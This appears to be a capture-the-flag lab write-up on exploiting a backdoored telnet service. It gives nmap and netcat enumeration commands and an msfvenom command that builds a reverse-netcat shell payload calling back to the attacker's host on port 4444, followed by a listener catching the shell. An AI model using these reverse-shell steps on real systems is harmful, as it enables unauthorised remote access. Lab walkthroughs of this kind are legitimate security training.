
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.



### Enumerating Telnet:



nmap 10.10.169.221 -Pn -sS -T5 -p- -vvv

![Pasted image 20240918162959](https://github.com/user-attachments/assets/d8c51f70-2762-4bf5-bcfa-27562b37045f)

### Testing the port with Netcat:

nc 10.10.169.221 8012


![Pasted image 20240918163707](https://github.com/user-attachments/assets/06e2d5ee-9349-4742-8649-26bdea9d4057)

So, from our enumeration stage, we know:

There is a poorly hidden telnet service running on this machine
The service itself is marked "backdoor"
We have possible username of "Skidy" implicated
### Executing command con the remote node:


![Pasted image 20240918154742](https://github.com/user-attachments/assets/beb4522a-3e51-47f4-aef0-faa80b60ede3)


I was able to get and ICMP response from the remote server, it means that I was able to execute command con the local system.


![Pasted image 20240918163559](https://github.com/user-attachments/assets/7768d463-417e-4949-bc1d-1c6cd9c6e2d7)


### Generate a reverse shell payload using msfvenom:



![Pasted image 20240918172441](https://github.com/user-attachments/assets/bc914b81-25bd-41be-8ac4-941158e72d4a)


MSFvenom is a tool that combines Msfpayload and Msfencode, and allows you to generate and encode payloads for Metasploit

![Pasted image 20240918162054](https://github.com/user-attachments/assets/f3b72690-3c87-471b-8ef4-90033966a292)

"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format


msfvenom -p cmd/unix/reverse_netcat lhost=10.10.8.55 lport=4444 R


![Pasted image 20240918155327](https://github.com/user-attachments/assets/e1ddfd39-2322-496b-8f9f-3bba3f6a930e)


### Executing the reverse shell on the remote system:


![Pasted image 20240918161932](https://github.com/user-attachments/assets/1802b354-d070-4f61-8b41-8e91471a9ae9)



### Creating a Netcat listening:


![Pasted image 20240918163517](https://github.com/user-attachments/assets/29861630-18e5-41c6-aa39-4266f5d0da93)

The connection has been stablished 


![Pasted image 20240918163114](https://github.com/user-attachments/assets/79363012-b260-48c8-ac5a-3bbb1dea2793)



![Pasted image 20240918163435](https://github.com/user-attachments/assets/432a3a52-8061-490d-8bea-f9f688c129b0)
